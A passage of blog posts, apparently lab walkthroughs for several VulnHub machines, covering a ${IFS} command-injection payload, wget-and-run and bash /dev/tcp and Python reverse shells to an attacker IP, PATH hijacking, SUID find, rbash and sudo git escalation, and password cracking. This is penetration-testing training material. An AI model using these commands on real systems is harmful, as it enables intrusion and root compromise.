src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109161006.png\" alt=\"\"></p>\n<p>抓包可以看到报错信息，得知有个叫youtube-dl的服务</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109161756.png\" alt=\"\"></p>\n<p>github上瞅瞅发现是个高达87k的项目</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109162035.png\" alt=\"\"></p>\n<h3 id=\"命令执行获取shell\"><a href=\"#命令执行获取shell\" class=\"headerlink\" title=\"命令执行获取shell\"></a>命令执行获取shell</h3><p>抓包测试发现存在命令执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109164342.png\" alt=\"\"></p>\n<p>但是貌似空格出了点问题，${IFS}试试</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109170246.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109170308.png\" alt=\"\"></p>\n<p>尝试反弹shell，bash失败，python失败</p>\n<p>尝试wget下载文件到目标主机执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1;wget$&#123;IFS&#125;http:&#x2F;&#x2F;192.168.93.129&#x2F;shell.txt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109170440.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1;bash$&#123;IFS&#125;shell.txt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109171011.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109171130.png\" alt=\"\"></p>\n<h3 id=\"特权文件提权\"><a href=\"#特权文件提权\" class=\"headerlink\" title=\"特权文件提权\"></a>特权文件提权</h3><p>只有一个用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109171322.png\" alt=\"\"></p>\n<p>上传pspy64我们可以看到目标主机会自动执行两个文件，都是root权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109172503.png\" alt=\"\"></p>\n<p>cloud-id是root权限我们动不了，但是clean.sh是www-data可读可写</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109172658.png\" alt=\"\"></p>\n<p>那么直接写入bash命令反弹即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.93.129&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109173015.png\" alt=\"\"></p>\n<p>等待执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109173118.png\" alt=\"\"></p>\n<p>root目录下找到第二个flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20210109173203.png\" alt=\"\"></p>\n","categories":["vulnhub"]},{"title":"vulnhub——os_bytesec","url":"/2020/12/25/vulnhub_os_bytesec/","content":"<p>终于放假了。。。。</p>\n<h2 id=\"Os-Bytes\"><a href=\"#Os-Bytes\" class=\"headerlink\" title=\"Os-Bytes\"></a>Os-Bytes</h2><h3 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225181801.png\" alt=\"\"></p>\n<p>80端口开着，ssh端口被改到了2525。</p>\n<p>dirb扫描没啥发现</p>\n<p>网页的gallery目录列出目录下文件，尝试目录穿越失败</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225182002.png\" alt=\"\"></p>\n<p>news栏目只有张图</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225182102.png\" alt=\"\"></p>\n<p>百度一波，得知是一种蓝牙攻击，可以通过攻击造成Windows远程桌面服务的远程代码执行，嗯。。。然而这是linux</p>\n<p>网页底部存在可能是提示信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225183420.png\" alt=\"\"></p>\n<p>前面已经扫到目标主机开放了两个Samba端口，首先了解一下Samba</p>\n<blockquote>\n<p>服务器消息块（SMB）协议是一种网络文件共享协议，在Microsoft Windows中实现称为Microsoft SMB协议。SMB允许您共享文件，磁盘，目录，打印机等<br>从Windows 2000及更高版本开始，SMB可以使用端口445在<code>TCP / IP</code>上运行，而无需运行<code>NetBIOS</code>会话。由于SMB提供了多种功能，例如操作文件，共享，消息传递，IPC等，它在内网枚举和内网探索阶段是对黑客最有吸引力的服务之一。</p>\n</blockquote>\n<p>百度得知相应协议</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225183642.png\" alt=\"\"></p>\n<h3 id=\"Samba攻击\"><a href=\"#Samba攻击\" class=\"headerlink\" title=\"Samba攻击\"></a>Samba攻击</h3><p>搜索相关攻击信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225184106.png\" alt=\"\"></p>\n<p>MSF应当是集成了一些payload，试一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225184632.png\" alt=\"\"></p>\n<p>嗯。。。。全失败。。回到百度点开第一个<a href=\"https://cloud.tencent.com/developer/article/1079631\" target=\"_blank\" rel=\"noopener\">连接</a>，条件挺像的，跟着试下，SMBSHARE这里需要一个可写的目录，保险设置为tmp</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225185619.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225190032.png\" alt=\"\"></p>\n<p>仍然失败。。。</p>\n<p>接着百度，得知我们可以用smbclient访问</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225190319.png\" alt=\"\"></p>\n<p>但这里root密码以及用户都不知道</p>\n<p>尝试爆破用户名密码，一番无果最后却发现是任意用户无密码登录。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225195604.png\" alt=\"\"></p>\n<p>但是没有权限读取共享目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225200127.png\" alt=\"\"></p>\n<h4 id=\"enum4linux枚举smb用户\"><a href=\"#enum4linux枚举smb用户\" class=\"headerlink\" title=\"enum4linux枚举smb用户\"></a>enum4linux枚举smb用户</h4><p>看wp学到了使用enum4linux枚举smb用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">enum4linux 192.168.3.105</span><br></pre></td></tr></table></figure>\n\n<p>这条命令会自动收集收集目标系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等</p>\n<p>得知有三个用户sagar，blackjax，smb</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225200626.png\" alt=\"\"></p>\n<p>挨个尝试看哪个可以读取共享目录</p>\n<p>得知smb用户具有查看权限</p>\n<h4 id=\"读取共享文件\"><a href=\"#读取共享文件\" class=\"headerlink\" title=\"读取共享文件\"></a>读取共享文件</h4><p>smbclient登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225201557.png\" alt=\"\"></p>\n<p>挨个目录看，啥都没有。。。</p>\n<p>陷入僵局。。。再次偷瞄wp，得知还有个smb的隐藏目录（可能是通过上图中.和..的猜测？）</p>\n<p>登录成功，目录下存在两个文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225202955.png\" alt=\"\"></p>\n<p>下载两个文件查看，其中一个zip需要密码</p>\n<p>john爆破</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225203352.png\" alt=\"\"></p>\n<p>解压得到图片和数据包</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225204228.png\" alt=\"\"></p>\n<p>wireshark打开，都是802.11的包，也就是无线局域网</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225204200.png\" alt=\"\"></p>\n<p>看看有没啥信息</p>\n<p>广播信息里包含了WLAN的名称：blackjax，嗯，和刚才得到的用户名中的一个一致</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225204955.png\" alt=\"\"></p>\n<h3 id=\"爆破匹配wlan密码\"><a href=\"#爆破匹配wlan密码\" class=\"headerlink\" title=\"爆破匹配wlan密码\"></a>爆破匹配wlan密码</h3><p>利用aircrack-ng工具，可以对wlan数据包进行密码匹配</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225205940.png\" alt=\"\"></p>\n<p>那么现在已知wlan名称：blackjax    密码：snowflake</p>\n<p>尝试ssh连接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225210229.png\" alt=\"\"></p>\n<p>成功登录并得到第一个flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225210654.png\" alt=\"\"></p>\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p>查看root权限文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225210906.png\" alt=\"\"></p>\n<p>ping命令好像可以<a href=\"https://blog.csdn.net/weixin_34337381/article/details/85096927\" target=\"_blank\" rel=\"noopener\">提权</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225211733.png\" alt=\"\"></p>\n<p>无奈第三步就死了</p>\n<p>注意到还有个netscan，显示的是端口使用情况等信息</p>\n<p>追踪命令执行过程</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225212147.png\" alt=\"\"></p>\n<p>发现其实就是system执行了netstat命令，这种情况在之前的练习已经<a href=\"https://www.blacknight.top/2020/08/12/ichunqiu_attackpractice/\">写到过</a>，可以做劫持</p>\n<p>system执行的是netstat，netstat是在/bin目录下，system读取的其实就是env中的PATH，因此我们只要将PATH修改成我们的路径，再构造相应的文件名和命令，就可以实现恶意劫持</p>\n<p>构造文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cd &#x2F;tmp   </span><br><span class=\"line\">$ touch netstat;echo &#39;&#x2F;bin&#x2F;bash&#x2F;&#39; &gt;&gt; netstat </span><br><span class=\"line\">$ cat netstat</span><br><span class=\"line\">&#x2F;bin&#x2F;bash&#x2F;</span><br><span class=\"line\">$ chmod 755 netstat</span><br></pre></td></tr></table></figure>\n\n<p>修改环境变量使得指向/tmp</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225213306.png\" alt=\"\"></p>\n<p>执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225213516.png\" alt=\"\"></p>\n<p>光速打脸，好吧没有bash，仔细看下之后sh，那么改下就成</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201225213618.png\" alt=\"\"></p>\n<p>成功提权，得到第二个flag，完成</p>\n","categories":["vulnhub"],"tags":["Samba"]},{"title":"vulnhub——DC系列","url":"/2020/10/25/vulnhub_DC/","content":"<h2 id=\"DC-1\"><a href=\"#DC-1\" class=\"headerlink\" title=\"DC-1\"></a>DC-1</h2><h3 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p>扫描端口服务</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010160958.png\" alt=\"\"></p>\n<p>发现开启了111端口，搜集一波信息，找到一篇<a href=\"https://www.aqniu.com/threat-alert/24769.html\" target=\"_blank\" rel=\"noopener\">文章</a>，可以对服务器ddos从而使其崩溃，这里我们大概没啥用</p>\n<p>访问网站，得知web框架是drupal</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010164321.png\" alt=\"\"></p>\n<p>百度下有挺多getshell教程，msf搜索下有没有集成相关漏洞</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010185012.png\" alt=\"\"></p>\n<h3 id=\"msf获取会话\"><a href=\"#msf获取会话\" class=\"headerlink\" title=\"msf获取会话\"></a>msf获取会话</h3><p>挨个试，试到第五个成功获取session</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010190300.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010190354.png\" alt=\"\"></p>\n<p>python建立交互式shell，在当前目录下找到flag1，并且下一步提示在配置文件里</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010190640.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010190844.png\" alt=\"\"></p>\n<p>在站点的default目录下找到了一个settings.php，查看后得到数据库用户名和密码以及下一步的提示</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010192213.png\" alt=\"\"></p>\n<h3 id=\"重置网站管理员密码\"><a href=\"#重置网站管理员密码\" class=\"headerlink\" title=\"重置网站管理员密码\"></a>重置网站管理员密码</h3><p>尝试登录mysql</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010192720.png\" alt=\"\"></p>\n<p>drupaldb库里有张user表，在里面找到用户名以及hash处理后的密码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010192839.png\" alt=\"\"></p>\n<p>试着john和hashcat解密，解不开，后来搜到一篇<a href=\"https://www.itread01.com/p/1150641.html\" target=\"_blank\" rel=\"noopener\">文章</a>说可以重置密码，重置下即可</p>\n<p>首先使用密码生成脚本生成新密码的hash</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010194936.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010200544.png\" alt=\"\"></p>\n<p>拿到hash在mysql中手动更新一下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010200938.png\" alt=\"\"></p>\n<p>但我这里因为超过失败次数账号被锁了，那么按照文章中说的，情况flood表即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">truncate table flood</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"管理员登录\"><a href=\"#管理员登录\" class=\"headerlink\" title=\"管理员登录\"></a>管理员登录</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010202038.png\" alt=\"\"></p>\n<p>在dashboard里找到flag3</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010202158.png\" alt=\"\"></p>\n<h3 id=\"SUID-find提权\"><a href=\"#SUID-find提权\" class=\"headerlink\" title=\"SUID_find提权\"></a>SUID_find提权</h3><p>根目录下发现home目录下有flag4文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010202518.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010202837.png\" alt=\"\"></p>\n<p>提示我们要提权，我们查看下系统内核</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010203513.png\" alt=\"\"></p>\n<p>本来想到脏牛，但靶机没有安装gcc环境，那么试下SUID提权</p>\n<p>首先查找拥有SUID权限的文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010203959.png\" alt=\"\"></p>\n<p>我们可以看到文件是具有root权限的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010204258.png\" alt=\"\"></p>\n<p>我们可以利用其权限执行命令，常用的是find命令，它有一个<code>-exec</code>选项，可以让我们执行shell命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;find flag1.txt -exec whoami \\;\t\t\t#这里的文件必须是能找到的</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010204952.png\" alt=\"\"></p>\n<p>在kali上新开一个终端nc监听端口，靶机建立一个python开启一个连接</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;find &#x2F;var&#x2F;www&#x2F;flag1.txt -exec python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.128&quot;,3122));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; \\;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010205605.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010205622.png\" alt=\"\"></p>\n<p>find命令找到flag文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010205846.png\" alt=\"\"></p>\n<p>读取flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201010205930.png\" alt=\"\"></p>\n<p>完成</p>\n<h2 id=\"DC-2\"><a href=\"#DC-2\" class=\"headerlink\" title=\"DC-2\"></a>DC-2</h2><h3 id=\"信息搜集-1\"><a href=\"#信息搜集-1\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p>扫描端口，ssh端口被改了下</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011104346.png\" alt=\"\"></p>\n<p>访问80端口发现被重定向，那么修改一下hosts文件即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011192301.png\" alt=\"\"></p>\n<p>修改之后目录扫描发现一些wordpress的目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011195458.png\" alt=\"\"></p>\n<p>并且whatweb扫出来了wordpress4.7.10，挺老的版本了，应该有洞</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011195224.png\" alt=\"\"></p>\n<p>在菜单栏得到flag1<br><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011192334.png\" alt=\"\"></p>\n<h3 id=\"bp-wpscan爆破用户名和密码\"><a href=\"#bp-wpscan爆破用户名和密码\" class=\"headerlink\" title=\"bp||wpscan爆破用户名和密码\"></a>bp||wpscan爆破用户名和密码</h3><p>提示说需要用cewl，说我们需要用某个账号登录来得到下一个flag</p>\n<p>百度下cewl是一个kali自带的根据网站深度自动生成字典的工具，<a href=\"https://www.freebuf.com/articles/network/190128.html\" target=\"_blank\" rel=\"noopener\">简单了解一下咋用</a>，试着生成一个字典</p>\n<p>输入下列命令之后，爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011193356.png\" alt=\"\"></p>\n<p>加上-w参数保存结果到文件</p>\n<p>有了可能包含了密码的字典，那么现在需要一个用户名，菜单栏里有个ourpeople，但点进去发现貌似是一种似英文而不是英文的东西，信息搜集失败</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011194712.png\" alt=\"\"></p>\n<p><code>/wp-admin/</code>进去看下后台，后台的检验方式可以爆破出用户账号</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011200809.png\" alt=\"\"></p>\n<p>抓包爆破出这几个</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011200940.png\" alt=\"\"></p>\n<p>用intruder的cluster bomb模式爆破下，用户名添加这三个，密码加载上之前cewl得到的字典，爆破出来两个</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011201328.png\" alt=\"\"></p>\n<p>后来在看wp时了解到还有种获得用户名的方法</p>\n<p>wpscan是一款专业针对WordPress安全扫描仪，学着用下</p>\n<p><code>wpscan --url http://dc-2</code>进行信息扫描</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011205919.png\" alt=\"\"></p>\n<p><code>wpscan --url http://dc-2 -e u</code>进行用户名枚举</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011210124.png\" alt=\"\"></p>\n<p>再使用cewl爬取的密码文件进行爆破账号密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wpscan --url http:&#x2F;&#x2F;dc-2 -U u.txt -P aa.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011210434.png\" alt=\"\"></p>\n<p>这样也可以得到用户名密码</p>\n<p>登录看看，在jerry用户上找到flag2</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201011204747.png\" alt=\"\"></p>\n<h3 id=\"爆破ssh登录\"><a href=\"#爆破ssh登录\" class=\"headerlink\" title=\"爆破ssh登录\"></a>爆破ssh登录</h3><p>用wpscan扫了下主题和插件漏洞没啥发现，试着hydra用刚得到的字典爆破下ssh，发现tom用户可以登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012165255.png\" alt=\"\"></p>\n<p>那么ssh登录</p>\n<p>操作发现一些命令被移除，但vi可以用</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012173544.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012173707.png\" alt=\"\"></p>\n<p>提示提权，但开启了rbash限制</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012190012.png\" alt=\"\"></p>\n<h3 id=\"rbash逃逸\"><a href=\"#rbash逃逸\" class=\"headerlink\" title=\"rbash逃逸\"></a>rbash逃逸</h3><p>google了下相关信息，大概学到了两种方法适用</p>\n<p>一种是利用vi提权</p>\n<p>先后在vi的命令模式下执行以下两条指令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">:set shell&#x3D;&#x2F;bin&#x2F;sh</span><br><span class=\"line\">:shell</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012194239.png\" alt=\"\"></p>\n<p>一种是利用BASH_CMDS，它是含有命令的内部散列表的数组，我们可以添加元素，然后执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012194627.png\" alt=\"\"></p>\n<p>ps：另外还学到了一个自动补全命令<code>compgen -c</code>，通过这个我们可以得知当前可以使用的命令</p>\n<p>但我们逃逸了之后还是会发现无法执行命令，原因是环境变量中命令调取的路径被改变了，我们执行<code>export PATH=/usr/bin:/usr/sbin:/bin:/sbin</code>把路径改回来，就可以正常执行命令了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012195359.png\" alt=\"\"></p>\n<p>find命令寻找flag文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012195458.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012195600.png\" alt=\"\"></p>\n<p>虽然说没hints，但最后说了一句git出去，也就是git提权了</p>\n<h3 id=\"git提权\"><a href=\"#git提权\" class=\"headerlink\" title=\"git提权\"></a>git提权</h3><p>tom用户里找不到更多信息了，之前找不到的su命令可以用了，利用之前的密码切换到jerry，百度些git提权的信息学习了下</p>\n<p>linux中more和less命令允许我们以分页的方式查看文本文件，如果我们在这种分页状态下输入诸如<code>!&#39;ls&#39;</code>的指令，引号之中的命令就会执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012204556.png\" alt=\"\"></p>\n<p>而git中正好有一个<code>-p</code>选项支持用分页的方式阅读帮助信息，这种模式和more，less命令的模式相同</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012204830.png\" alt=\"\"></p>\n<p>我们执行<code>sudo -l</code>查看sudo的权限，这里提示我们git命令是root权限并且是不需要密码的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012205821.png\" alt=\"\"></p>\n<p>那么sudo执行<code>git -p</code>，在分页模式下执行<code>!&#39;/bin/sh&#39;</code>即可获取一个root权限的shell</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012210142.png\" alt=\"\"></p>\n<p><code>find</code>查找flag，找到最后一个flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201012210247.png\" alt=\"\"></p>\n<p>完成</p>\n<h2 id=\"DC-3\"><a href=\"#DC-3\" class=\"headerlink\" title=\"DC-3\"></a>DC-3</h2><h3 id=\"信息搜集-2\"><a href=\"#信息搜集-2\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><p>端口只开了一个80</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013182820.png\" alt=\"\"></p>\n<p>探测到的是bootstrap框架</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013183219.png\" alt=\"\"></p>\n<p>后台地址</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013183904.png\" alt=\"\"></p>\n<p>打开网址得知系统是joomla</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013184023.png\" alt=\"\"></p>\n<p>用xray扫出了一个cve</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013190406.png\" alt=\"\"></p>\n<h3 id=\"cve得到用户名密码\"><a href=\"#cve得到用户名密码\" class=\"headerlink\" title=\"cve得到用户名密码\"></a>cve得到用户名密码</h3><p>github上找到这个cve的<a href=\"https://github.com/stefanlucas/Exploit-Joomla\" target=\"_blank\" rel=\"noopener\">poc</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013190824.png\" alt=\"\"></p>\n<p>成功得到管理员hash后的密码，试着放到john里爆破，得snoopy</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013191041.png\" alt=\"\"></p>\n<h3 id=\"getshell\"><a href=\"#getshell\" class=\"headerlink\" title=\"getshell\"></a>getshell</h3><p>登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013192829.png\" alt=\"\"></p>\n<p>看能不能找到上传点getshell</p>\n<p>模板处找到上传点</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013202337.png\" alt=\"\"></p>\n<p>点击new file生成一个php文件，将一句话代码写入，蚁剑连接</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013203556.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013204931.png\" alt=\"\"></p>\n<p>或者这里用msf也行，它直接集成了这个cve，设置payload之后expliot可以直接getshell，方便又快捷</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013205935.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013205759.png\" alt=\"\"></p>\n<h3 id=\"double-fdput提权\"><a href=\"#double-fdput提权\" class=\"headerlink\" title=\"double_fdput提权\"></a>double_fdput提权</h3><p>查看下系统内核是16年的ubuntu</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013210149.png\" alt=\"\"></p>\n<p>发现有git，下载个linux漏洞检测工具试试</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013220810.png\" alt=\"\"></p>\n<p>执行脚本列出了几个可能的漏洞</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013220935.png\" alt=\"\"></p>\n<p>并且给了各个漏洞的利用脚本，一个个试，两个脏牛直接导致会话崩溃，第三个成功提权</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201013230508.png\" 